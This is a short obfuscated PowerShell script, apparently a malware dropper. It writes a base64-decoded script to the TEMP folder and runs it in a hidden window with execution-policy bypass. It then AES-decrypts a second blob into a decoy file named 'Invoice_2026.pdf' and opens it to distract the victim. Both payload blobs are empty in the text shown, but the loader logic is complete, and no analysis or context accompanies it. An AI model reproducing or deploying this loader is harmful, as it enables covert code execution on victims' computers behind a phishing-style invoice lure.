$khvg='Start-Process'
$tmp=[Convert]::FromBase64String('')
$tps="$env:TEMP\amdrevji.ps1"
[IO.File]::WriteAllBytes($tps,$tmp)
& $khvg '$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe' "-NoP -NonI -W Hidden -Ex Bypass -File `"$tps`"" -Wait
$jaxjdu=[Convert]::FromBase64String('FA3q2sxP6tQ0B3NEFCs6rq8RWIStyYdgSBqGGlQS3Ok=')
$xyubvy=[Convert]::FromBase64String('PaaGKjKmzxBVrBN9Z3J1og==')
$wddwxx=[Convert]::FromBase64String('')
$aifjxx=New-Object Security.Cryptography.AesManaged
$aifjxx.Key=$jaxjdu;$aifjxx.IV=$xyubvy;$aifjxx.Mode='CBC';$aifjxx.Padding='PKCS7'
$dllgjx=$aifjxx.CreateDecryptor()
$trppbw=New-Object IO.MemoryStream(,$wddwxx)
$smweko=New-Object Security.Cryptography.CryptoStream($trppbw,$dllgjx,[Security.Cryptography.CryptoStreamMode]::Read)
$uillcf=New-Object IO.MemoryStream
$smweko.CopyTo($uillcf)
$pgorbi="$env:TEMP\Invoice_2026.pdf"
[IO.File]::WriteAllBytes($pgorbi,$uillcf.ToArray())
$aifjxx.Dispose()
& $khvg $pgorbi
